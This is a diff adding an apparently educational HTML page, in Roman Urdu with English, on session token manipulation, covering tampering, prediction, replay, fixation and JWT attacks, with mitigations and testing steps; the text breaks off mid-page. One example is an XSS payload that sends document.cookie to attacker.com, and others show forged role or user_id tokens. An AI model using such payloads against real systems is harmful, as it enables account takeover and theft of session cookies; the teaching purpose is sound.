@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="ur" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Token Manipulation - Authentication Bypass</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            line-height: 1.8;
+            direction: ltr;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+
+        .breadcrumb {
+            background: #f8f9fa;
+            padding: 15px 40px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .breadcrumb a {
+            color: #11998e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .intro-section {
+            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border-left: 5px solid #00b894;
+        }
+
+        .intro-section h2 {
+            color: #00b894;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+
+        .intro-section p {
+            color: #2d3436;
+            font-size: 1.1em;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .analogy-box {
+            background: white;
+            border: 2px solid #00b894;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .analogy-box h4 {
+            color: #00b894;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .analogy-box p {
+            color: #2d3436;
+        }
+
+        .section {
+            margin-bottom: 40px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            border-left: 5px solid #667eea;
+        }
+
+        .section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+            display: flex;
+            align-items: center;
+        }
+
+        .section h3 {
+            color: #00b894;
+            margin: 25px 0 15px 0;
+            font-size: 1.4em;
+        }
+
+        .section p {
+            color: #2d3436;
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        .section ul {
+            margin-left: 20px;
+            color: #2d3436;
+        }
+
+        .section ul li {
+            margin: 10px 0;
+        }
+
+        .methods-section {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            border-left: 5px solid #fd79a8;
+        }
+
+        .methods-section h2 {
+            color: #d63031;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .method-card {
+            background: white;
+            margin: 20px 0;
+            padding: 25px;
+            border-radius: 10px;
+            border-left: 4px solid #fd79a8;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .method-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .method-card h3 {
+            color: #fd79a8;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        .method-card p {
+            color: #2d3436;
+            margin-bottom: 10px;
+        }
+
+        .method-card ul {
+            margin-left: 20px;
+            color: #2d3436;
+        }
+
+        .method-card ul li {
+            margin: 8px 0;
+        }
+
+        .example-box {
+            background: #f8f9fa;
+            border: 2px dashed #fd79a8;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .example-box h4 {
+            color: #fd79a8;
+            margin-bottom: 8px;
+            font-size: 1.05em;
+        }
+
+        .example-box code {
+            background: #e9ecef;
+            padding: 8px 12px;
+            border-radius: 4px;
+            color: #e83e8c;
+            font-family: 'Courier New', monospace;
+            display: block;
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+
+        .example-box p {
+            color: #2d3436;
+            margin: 5px 0;
+            font-size: 0.95em;
+        }
+
+        .vulnerabilities-section {
+            background: linear-gradient(135deg, #d4fc79 0%, #96e6a1 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            border-left: 5px solid #6c5ce7;
+        }
+
+        .vulnerabilities-section h2 {
+            color: #6c5ce7;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .vuln-card {
+            background: white;
+            margin: 15px 0;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #6c5ce7;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .vuln-card strong {
+            color: #6c5ce7;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .vuln-card p {
+            color: #2d3436;
+            margin-bottom: 8px;
+        }
+
+        .scenarios-section {
+            background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            border-left: 5px solid #e17055;
+        }
+
+        .scenarios-section h2 {
+            color: #d63031;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .scenario-card {
+            background: white;
+            margin: 20px 0;
+            padding: 25px;
+            border-radius: 10px;
+            border-left: 4px solid #e17055;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .scenario-card h3 {
+            color: #e17055;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        .scenario-card p {
+            color: #2d3436;
+            margin-bottom: 10px;
+        }
+
+        .scenario-card code {
+            background: #f1f3f5;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #e83e8c;
+            font-family: 'Courier New', monospace;
+        }
+
+        .defense-section {
+            background: linear-gradient(135deg, #e0c3fc 0%, #8ec5fc 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            border-left: 5px solid #667eea;
+        }
+
+        .defense-section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .defense-card {
+            background: white;
+            margin: 15px 0;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .defense-card strong {
+            color: #667eea;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .defense-card p {
+            color: #2d3436;
+            margin-bottom: 8px;
+        }
+
+        .defense-card ul {
+            margin-left: 20px;
+            color: #2d3436;
+        }
+
+        .defense-card ul li {
+            margin: 6px 0;
+        }
+
+        .testing-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            border-left: 5px solid #00b894;
+        }
+
+        .testing-section h2 {
+            color: #00b894;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .testing-card {
+            background: white;
+            margin: 15px 0;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #00b894;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .testing-card h3 {
+            color: #00b894;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .testing-card p {
+            color: #2d3436;
+            font-size: 0.95em;
+            margin-bottom: 8px;
+        }
+
+        .testing-card ol {
+            margin-left: 20px;
+            color: #2d3436;
+        }
+
+        .testing-card ol li {
+            margin: 8px 0;
+        }
+
+        .testing-card code {
+            background: #f1f3f5;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #e83e8c;
+            font-family: 'Courier New', monospace;
+        }
+
+        .danger-box {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .danger-box h4 {
+            color: #721c24;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .danger-box p {
+            color: #721c24;
+        }
+
+        .danger-box ul {
+            margin-left: 20px;
+            color: #721c24;
+        }
+
+        .danger-box ul li {
+            margin: 6px 0;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .warning-box p {
+            color: #856404;
+        }
+
+        .key-point {
+            background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 5px solid #667eea;
+        }
+
+        .key-point h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .key-point p {
+            color: #2d3436;
+        }
+
+        .conclusion {
+            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+            text-align: center;
+            border: 3px solid #00b894;
+        }
+
+        .conclusion h3 {
+            color: #00b894;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+
+        .conclusion p {
+            color: #2d3436;
+            font-size: 1.1em;
+            line-height: 1.8;
+        }
+
+        .icon {
+            font-size: 1.5em;
+            margin-right: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 1.8em;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .section, .methods-section, .vulnerabilities-section, .scenarios-section, .defense-section, .testing-section {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎫 Session Token Manipulation</h1>
+            <p>Tokens Ko Badal Kar Authentication Bypass Karna</p>
+        </div>
+
+        <div class="breadcrumb">
+            <a href="../../index.html">🏠 Home</a> /
+            <a href="../index.html">Shurwati Hamle</a> /
+            <a href="index.html">Authentication Bypass</a> /
+            <span>Session Token Manipulation</span>
+        </div>
+
+        <div class="content">
+            <div class="intro-section">
+                <h2>🎯 Session Token Kya Hai?</h2>
+                <p>
+                    Jab aap kisi application (web ya API) mein login karte hain, toh server ek unique identifier banata hai jise <strong>"session token"</strong> (ya session ID) kehte hain. Yeh token phir aapke browser ya client application ko wapas bheja jata hai aur store ho jata hai (aksar cookie ya local storage mein).
+                </p>
+                <p>
+                    Har agle request ke liye, aapka client yeh token server ko wapas bhejta hai, jis se server aapko ek authenticated user ke taur par pehchan leta hai, aur aapko har baar apni credentials dobara daalne ki zaroorat nahi padti.
+                </p>
+                
+                <div class="analogy-box">
+                    <h4>🎭 Misaal</h4>
+                    <p>
+                        Isko aise samjhen jaise ek <strong>temporary ID card</strong> jo yeh sabit karta hai ki aapko ek khaas jagah par ek khaas muddat ke liye rehne ki ijazat hai, jab aapne ek baar apni asli ID (username/password) dikha di ho.
+                    </p>
+                </div>
+
+                <p style="margin-top: 15px;">
+                    <strong>"Session Token Manipulation"</strong> "API Hacking" roadmap ke "Authentication Bypass" section mein aata hai. Yeh ek tareeqa hai jise attackers authentication ko bypass karne ke liye istemal karte hain, session tokens ko badal kar ya farzi bana kar.
+                </p>
+            </div>
+
+            <div class="section">
+                <h2><span class="icon">🔄</span>Session Token Ka Lifecycle</h2>
+                <p>
+                    Session token ki zindagi kai stages se guzarti hai:
+                </p>
+                <ol style="margin-left: 20px; margin-top: 15px; color: #2d3436;">
+                    <li style="margin: 12px 0;">
+                        <strong>Generation:</strong> User login karta hai → Server unique token generate karta hai
+                    </li>
+                    <li style="margin: 12px 0;">
+                        <strong>Distribution:</strong> Token client ko bheja jata hai (cookie, response body, header)
+                    </li>
+                    <li style="margin: 12px 0;">
+                        <strong>Storage:</strong> Client token ko store karta hai (cookies, localStorage, memory)
+                    </li>
+                    <li style="margin: 12px 0;">
+                        <strong>Transmission:</strong> Har request ke saath token bheja jata hai
+                    </li>
+                    <li style="margin: 12px 0;">
+                        <strong>Validation:</strong> Server har request par token verify karta hai
+                    </li>
+                    <li style="margin: 12px 0;">
+                        <strong>Expiration:</strong> Timeout ya logout par token expire hota hai
+                    </li>
+                </ol>
+            </div>
+
+            <div class="methods-section">
+                <h2><span class="icon">⚔️</span>Session Token Manipulation Kaise Kaam Karta Hai?</h2>
+                <p>
+                    Attackers in tokens ko badal kar ghair-mutalliq pahunch hasil karne ya apni privileges ko badhane ki koshish karte hain:
+                </p>
+
+                <div class="method-card">
+                    <h3>1. Maujooda Tokens Mein Tabdeeli (Token Tampering)</h3>
+                    <p>
+                        Ek attacker ek sahi session token ko pakad kar uske kuch hisson ko badalne ki koshish kar sakta hai, is ummeed par ki server use ab bhi accept kar lega ya use mukhtalif privileges de dega.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Token Tampering Example:</h4>
+                        <code>Original Token Payload:</code>
+                        <code>{"user_id": "123", "role": "user", "exp": 1234567890}</code>
+                        <p style="margin-top: 10px; color: #e17055;"><strong>Attacker modifies:</strong></p>
+                        <code>{"user_id": "123", "role": "admin", "exp": 1234567890}</code>
+                        <p style="margin-top: 8px;">Ya</p>
+                        <code>{"user_id": "456", "role": "user", "exp": 1234567890}</code>
+                        <p style="margin-top: 8px;">Agar signature verify nahi hota to attack successful!</p>
+                    </div>
+
+                    <ul style="margin-top: 15px;">
+                        <li>Role parameter ko user se admin change karna</li>
+                        <li>User ID ko doosre user ki ID se replace karna</li>
+                        <li>Expiry time ko extend karna</li>
+                        <li>Permissions array ko modify karna</li>
+                        <li>Boolean flags ko flip karna (is_verified, is_admin)</li>
+                    </ul>
+                </div>
+
+                <div class="method-card">
+                    <h3>2. Tokens Ka Andaza Lagana (Token Prediction)</h3>
+                    <p>
+                        Agar session tokens surakshit tareeqe se nahi banaye jaate (masalan, woh sequential hain, kamzor randomness istemal karte hain, ya predictable maloomat par mabni hain), toh ek attacker doosre users ke ya yahan tak ki administrator ke sahi tokens ka andaza laga sakta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Predictable Token Patterns:</h4>
+                        <code>Sequential IDs:</code>
+                        <code>Session1: 1000, Session2: 1001, Session3: 1002</code>
+                        <code>Attacker tries: 1003, 1004, 1005...</code>
+                        <p style="margin-top: 10px;">Ya</p>
+                        <code>Time-based:</code>
+                        <code>token = MD5(username + timestamp)</code>
+                        <code>Attacker can calculate tokens for known users</code>
+                        <p style="margin-top: 10px;">Ya</p>
+                        <code>Weak randomness:</code>
+                        <code>token = random(1000, 9999)  // Only 9000 possibilities!</code>
+                    </div>
+
+                    <ul style="margin-top: 15px;">
+                        <li>Sequential session IDs ka istemal</li>
+                        <li>Timestamp-based generation</li>
+                        <li>Weak random number generators</li>
+                        <li>User-specific predictable patterns</li>
+                        <li>Short token lengths</li>
+                    </ul>
+                </div>
+
+                <div class="method-card">
+                    <h3>3. Tokens Ko Dubara Istemal Karna (Token Replay)</h3>
+                    <p>
+                        Agar ek session token jaldi expire nahi hota ya kuch actions (jaise logout) ke baad invalidate nahi hota, toh ek attacker jo use pakad leta hai, use "replay" kar ke asli user ki naqal kar sakta hai, bhale hi user ne logout kar diya ho.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Replay Attack Scenario:</h4>
+                        <code>1. User logs in → Gets token: ABC123XYZ</code>
+                        <code>2. Attacker intercepts token (network sniffing)</code>
+                        <code>3. User logs out</code>
+                        <code>4. Attacker replays token: ABC123XYZ</code>
+                        <code>5. Server still accepts it! (Token not invalidated)</code>
+                        <code>6. Attacker gains unauthorized access</code>
+                    </div>
+
+                    <ul style="margin-top: 15px;">
+                        <li>Logout par token invalidate nahi hota</li>
+                        <li>Token expiry time bohot lamba hai</li>
+                        <li>Old tokens ka koi tracking nahi</li>
+                        <li>Token revocation mechanism missing</li>
+                        <li>Single sign-on (SSO) tokens ka misuse</li>
+                    </ul>
+                </div>
+
+                <div class="method-card">
+                    <h3>4. Tokens Churana (Token Stealing)</h3>
+                    <p>
+                        Jab ke yeh seedhe "manipulation" nahi hai, chori kiye gaye tokens aksar manipulation ke liye zaroori hote hain. Cross-Site Scripting (XSS) jaise tareeqon ka istemal user ke browser se session tokens (cookies) churane ke liye kiya ja sakta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Token Theft Methods:</h4>
+                        <code>// XSS Attack</code>
+                        <code>&lt;script&gt;fetch('http://attacker.com?token='+document.cookie)&lt;/script&gt;</code>
+                        <p style="margin-top: 10px;">Ya</p>
+                        <code>// Man-in-the-Middle (MITM)</code>
+                        <code>HTTP (non-HTTPS) connections se token intercept karna</code>
+                        <p style="margin-top: 10px;">Ya</p>
+                        <code>// Local Storage Theft</code>
+                        <code>localStorage.getItem('auth_token')</code>
+                    </div>
+
+                    <ul style="margin-top: 15px;">
+                        <li>Cross-Site Scripting (XSS) attacks</li>
+                        <li>Man-in-the-Middle (MITM) attacks</li>
+                        <li>Malware/Browser extensions</li>
+                        <li>Phishing attacks</li>
+                        <li>Local file system access</li>
+                        <li>Insecure storage (localStorage vulnerable to XSS)</li>
+                    </ul>
+                </div>
+
+                <div class="method-card">
+                    <h3>5. Session Fixation</h3>
+                    <p>
+                        Attacker pehle se ek session ID set kar leta hai, phir victim ko us session use karne par majboor karta hai. Jab victim login karta hai, attacker ke paas wahi session ID hota hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Session Fixation Flow:</h4>
+                        <code>1. Attacker visits site, gets session ID: FIXED123</code>
+                        <code>2. Attacker sends victim: http://site.com?session=FIXED123</code>
+                        <code>3. Victim clicks link and logs in with this session</code>
+                        <code>4. Server doesn't regenerate session ID after login</code>
+                        <code>5. Attacker uses FIXED123 to access victim's account</code>
+                    </div>
+                </div>
+
+                <div class="method-card">
+                    <h3>6. JWT Specific Attacks</h3>
+                    <p>
+                        JSON Web Tokens ke specific vulnerabilities ka exploitation.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 JWT Attack Vectors:</h4>
+                        <code>// None Algorithm Attack</code>
+                        <code>{"alg":"none","typ":"JWT"}</code>
+                        <code>Server accepts unsigned tokens!</code>
+                        <p style="margin-top: 10px;">Ya</p>
+                        <code>// Key Confusion</code>
+                        <code>Change RS256 (asymmetric) to HS256 (symmetric)</code>
+                        <code>Use public key as HMAC secret</code>
+                    </div>
+                </div>
+            </div>
+
+            <div class="vulnerabilities-section">
+                <h2><span class="icon">🐛</span>Yeh Ek Vulnerability Kyun Hai?</h2>
+                <p>
+                    Session token manipulation ki kamyabi aksar in kamzoriyon ki nishandahi karti hai:
+                </p>
+
+                <div class="vuln-card">
+                    <strong>1. Token Generation Ka Tareeqa</strong>
+                    <p>
+                        Agar tokens cryptographically mazboot, unique, aur unpredictable nahi hain toh easily guess ya brute force ho sakte hain.
+                    </p>
+                </div>
+
+                <div class="vuln-card">
+                    <strong>2. Token Ki Tasdeeq (Validation)</strong>
+                    <p>
+                        Agar server token ki integrity aur authenticity ko sahi tareeqe se validate nahi karta (masalan, agar digital signatures istemal hote hain toh unki jaanch nahi karta).
+                    </p>
+                </div>
+
+                <div class="vuln-card">
+                    <strong>3. Session Management Logic</strong>
+                    <p>
+                        Agar application logout, timeout, ya shukook-o-shubah wali activity ke baad sessions ko sahi tareeqe se invalidate nahi karti.
+                    </p>
+                </div>
+
+                <div class="vuln-card">
+                    <strong>4. Token Ka Mawad (Contents)</strong>
+                    <p>
+                        Agar sensitive maloomat ya authorization details seedhe token mein bina sahi encryption ya signing ke shamil kiye gaye hain, toh woh tampering ke liye kamzor ho jaate hain.
+                    </p>
+                </div>
+
+                <div class="vuln-card">
+                    <strong>5. Insecure Storage</strong>
+                    <p>
+                        Tokens ko insecure locations mein store karna jaise localStorage (XSS vulnerable) ya URL parameters.
+                    </p>
+                </div>
+
+                <div class="vuln-card">
+                    <strong>6. No Token Rotation</strong>
+                    <p>
+                        Login ya privilege escalation ke baad new token generate nahi hota.
+                    </p>
+                </div>
+            </div>
+
+            <div class="scenarios-section">
+                <h2><span class="icon">💥</span>Attack Scenarios Ki Misaalen</h2>
+
+                <div class="scenario-card">
+                    <h3>Scenario 1: Horizontal Privilege Escalation</h3>
+                    <p>
+                        Ek attacker ek user ke session token ko rokta hai aur token ke andar maujood <code>user_id</code> parameter ko badal kar kisi doosre user ke account tak pahunch hasil kar leta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Attack Flow:</h4>
+                        <code>Original Token: {"user_id": "100", "role": "user"}</code>
+                        <code>Modified Token: {"user_id": "200", "role": "user"}</code>
+                        <p style="margin-top: 8px;">Agar signature check nahi hai to User 100 ab User 200 ka data access kar sakta hai</p>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 2: Vertical Privilege Escalation</h3>
+                    <p>
+                        Ek attacker apne session token mein <code>role</code> parameter ko <code>user</code> se <code>admin</code> mein badal deta hai aur administrative privileges hasil kar leta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Attack Flow:</h4>
+                        <code>Original Token: {"user_id": "100", "role": "user"}</code>
+                        <code>Modified Token: {"user_id": "100", "role": "admin"}</code>
+                        <p style="margin-top: 8px;">Regular user ab admin panel access kar sakta hai</p>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 3: Sequential Session Hijacking</h3>
+                    <p>
+                        Ek application sequential session IDs istemal karti hai. Ek attacker login karta hai, ID: 100 hasil karta hai, phir ID: 99 aur ID: 101 ki koshish karta hai taake doosre sessions ko hijack kar sake.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Attack Flow:</h4>
+                        <code>Attacker logs in → Gets session_id = 5000</code>
+                        <code>Tries: 4999, 4998, 4997... (previous users)</code>
+                        <code>Tries: 5001, 5002, 5003... (concurrent users)</code>
+                        <p style="margin-top: 8px;">Agar tokens predictable hain to multiple accounts compromise ho sakte hain</p>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 4: Token Replay After Logout</h3>
+                    <p>
+                        User logout karta hai lekin uska token server-side invalidate nahi hota. Attacker purana token use kar ke access gain kar leta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Attack Flow:</h4>
+                        <code>User logs in at 10:00 AM → token: ABC123</code>
+                        <code>Attacker steals token at 10:30 AM</code>
+                        <code>User logs out at 11:00 AM</code>
+                        <code>Attacker uses ABC123 at 11:30 AM → Still works!</code>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 5: JWT None Algorithm</h3>
+                    <p>
+                        Attacker JWT token ke algorithm ko "none" set kar deta hai aur signature remove kar deta hai.
+                    </p>
+                    
+                    <div class="example-box">
+                        <h4>💡 Attack Flow:</h4>
+                        <code>Original JWT Header: {"alg":"HS256","typ":"JWT"}</code>
+                        <code>Modified Header: {"alg":"none","typ":"JWT"}</code>
+                        <code>Remove signature part</code>
+                        <code>Agar server "none" algorithm accept karta hai to attack successful</code>
+                    </div>
+                </div>
+            </div>
+
+            <div class="danger-box">
+                <h4>🚨 Session Token Manipulation Ke Serious Consequences</h4>
+                <ul>
+                    <li><strong>Account Takeover:</strong> Complete control over user accounts including admin accounts</li>
+                    <li><strong>Data Breach:</strong> Access to sensitive user data, financial information</li>
+                    <li><strong>Unauthorized Transactions:</strong> Banking/payment frauds</li>
+                    <li><strong>Identity Theft:</strong> Impersonation of legitimate users</li>
+                    <li><strong>Lateral Movement:</strong> Access to multiple accounts through predictable tokens</li>
+                    <li><strong>Long-term Access:</strong> Persistent backdoors through non-expiring tokens</li>
+                </ul>
+            </div>
+
+            <div class="defense-section">
+                <h2><span class="icon">🛡️</span>Bachao (Mitigation)</h2>
+                <p>
+                    Session token manipulation se bachne ke liye, applications ko chahiye:
+                </p>
+
+                <div class="defense-card">
+                    <strong>1. Cryptographically Secure Token Generation</strong>
+                    <p>
+                        Cryptographically surakshit, random, aur unpredictable session tokens banayein.
+                    </p>
+                    <ul>
+                        <li>Use cryptographically secure random number generators</li>
+                        <li>Minimum 128-bit entropy</li>
+                        <li>No predictable patterns (sequential, timestamp-based)</li>
+                        <li>UUID v4 ya similar standards use karen</li>
+                        <li>Sufficient token length (32+ characters)</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>2. Secure Cookie Flags</strong>
+                    <p>
+                        Cookies ke liye secure flags istemal karein.
+                    </p>
+                    <ul>
+                        <li><code>HttpOnly</code>: JavaScript se cookie access prevent karta hai (XSS protection)</li>
+                        <li><code>Secure</code>: Sirf HTTPS connections par cookies bhejta hai</li>
+                        <li><code>SameSite</code>: CSRF attacks se bachata hai (Strict ya Lax)</li>
+                        <li><code>Domain</code> aur <code>Path</code>: Scope limit karen</li>
+                    </ul>
+                    <div class="example-box">
+                        <h4>💡 Secure Cookie Example:</h4>
+                        <code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict</code>
+                    </div>
+                </div>
+
+                <div class="defense-card">
+                    <strong>3. Proper Session Timeout & Invalidation</strong>
+                    <p>
+                        Sahi session timeout aur invalidation mechanisms lagu karein.
+                    </p>
+                    <ul>
+                        <li>Idle timeout: 15-30 minutes of inactivity</li>
+                        <li>Absolute timeout: 8-12 hours maximum</li>
+                        <li>Logout par immediate invalidation</li>
+                        <li>Password change par sabhi sessions invalidate karen</li>
+                        <li>Server-side session tracking maintain karen</li>
+                        <li>Concurrent session limits enforce karen</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>4. Avoid Sensitive Data in Tokens</strong>
+                    <p>
+                        Token ke andar seedhe sensitive maloomat store karne se gurez karein.
+                    </p>
+                    <ul>
+                        <li>Token mein sirf session ID rakhen</li>
+                        <li>Sensitive data server-side store karen</li>
+                        <li>Agar zaroori ho to encrypt karen</li>
+                        <li>Never store passwords ya payment info in tokens</li>
+                        <li>Minimize PII (Personally Identifiable Information)</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>5. Strong JWT Implementation</strong>
+                    <p>
+                        JWT tokens ko properly implement karen with signing aur verification.
+                    </p>
+                    <ul>
+                        <li>Always use strong algorithms: RS256, ES256 (asymmetric preferred)</li>
+                        <li>Never accept "none" algorithm</li>
+                        <li>Verify signature on every request</li>
+                        <li>Use strong, secret keys (256-bit minimum)</li>
+                        <li>Implement token expiry (exp claim)</li>
+                        <li>Add issuer (iss) aur audience (aud) claims</li>
+                        <li>Use JTI (JWT ID) for token revocation</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>6. Token Regeneration</strong>
+                    <p>
+                        Critical actions par naye tokens generate karen.
+                    </p>
+                    <ul>
+                        <li>Login success par naya token</li>
+                        <li>Privilege escalation par naya token</li>
+                        <li>Password change par naya token</li>
+                        <li>Sensitive operations ke baad refresh</li>
+                        <li>Old tokens ko immediately invalidate karen</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>7. Monitoring & Logging</strong>
+                    <p>
+                        Session activity ko monitor aur log karen.
+                    </p>
+                    <ul>
+                        <li>Track session creation aur destruction</li>
+                        <li>Log suspicious patterns (multiple IPs, locations)</li>
+                        <li>Alert on concurrent sessions</li>
+                        <li>Monitor token validation failures</li>
+                        <li>Implement anomaly detection</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <strong>8. Rate Limiting</strong>
+                    <p>
+                        Token guessing attacks ko prevent karen.
+                    </p>
+                    <ul>
+                        <li>Limit token validation attempts</li>
+                        <li>Block IPs after threshold</li>
+                        <li>Implement exponential backoff</li>
+                        <li>CAPTCHA after failed attempts</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="testing-section">
+                <h2><span class="icon">🔍</span>Testing Methodology</h2>
+
+                <div class="testing-card">
+                    <h3>Test 1: Token Tampering</h3>
+                    <p>
+                        Session token ko modify kar ke test karen.
+                    </p>
+                    <ol>
+                        <li>Login karen aur session token capture karen</li>
+                        <li>Token ko decode karen (agar JWT hai)</li>
+                        <li>User ID, role, permissions modify karen</li>
+                        <li>Modified token se request bhejein</li>
+                        <li>Check karen ke server accept karta hai ya reject</li>
+                        <li>Burp Suite Repeater mein test karen</li>
+                    </ol>
+                </div>
+
+                <div class="testing-card">
+                    <h3>Test 2: Token Prediction</h3>
+                    <p>
+                        Token generation patterns identify karen.
+                    </p>
+                    <ol>
+                        <li>Multiple accounts se login karen</li>
+                        <li>Generated tokens collect karen</li>
+                        <li>Patterns analyze karen (sequential, timestamp)</li>
+                        <li>Token generation algorithm guess karen</li>
+                        <li>New tokens predict karen aur test karen</li>
+                    </ol>
+                </div>
+
+                <div class="testing-card">
+                    <h3>Test 3: Token Replay</h3>
+                    <p>
+                        Old tokens ka reuse test karen.
+                    </p>
+                    <ol>
+                        <li>Login karen aur token save karen</li>
+                        <li>Logout karen</li>
+                        <li>Old token dobara use karen</li>
+                        <li>Check karen ke server accept karta hai</li>
+                        <li>Password change ke baad bhi test karen</li>
+                    </ol>
+                </div>
+
+                <div class="testing-card">
+                    <h3>Test 4: JWT Vulnerabilities</h3>
+                    <p>
+                        JWT-specific attacks test karen.
+                    </p>
+                    <ol>
+                        <li>JWT token ko decode karen (jwt.io)</li>
+                        <li>Algorithm ko "none" change karen</li>
+                        <li>Signature remove karen</li>
+                        <li>Payload modify karen</li>
+                        <li>Key confusion attack try karen (RS256 to HS256)</li>
+                        <li>Weak keys ke saath brute force karen</li>
+                    </ol>
+                </div>
+
+                <div class="testing-card">
